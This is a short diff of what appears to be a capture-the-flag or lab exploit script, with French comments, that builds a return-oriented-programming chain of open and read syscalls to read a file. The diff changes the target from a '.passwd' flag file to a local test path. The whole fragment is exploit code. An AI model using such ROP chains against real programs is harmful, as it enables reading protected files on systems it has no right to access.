@@ -81,11 +81,11 @@ ROPChain = (
 	p64(pop_rax) + p64(0x006b6018) +
 	p64(write_gadget) +
 	
-	# 2. Appel à open(".passwd", O_RDONLY)
+	# 2. Appel à open("/home/kali/Desktop/monfichier", O_RDONLY)
 	p64(pop_rax) + p64(2) + # Syscall open: numéro 2
 	p64(pop_rdi) + p64(0x006b6000) +  # Argument: chemin du fichier
 	p64(pop_rsi) + p64(0) +                   # Argument: O_RDONLY (flag 0)
-	p64(syscall_ret) +                            # Syscall: open(".passwd", O_RDONLY)
+	p64(syscall_ret) +                            # Syscall: open(fichier, O_RDONLY)
 	
 	# 3. Appel à read(fd, buffer, size)
 	p64(pop_rdi) + p64(3) +                   # Argument: file descriptor retourné par open
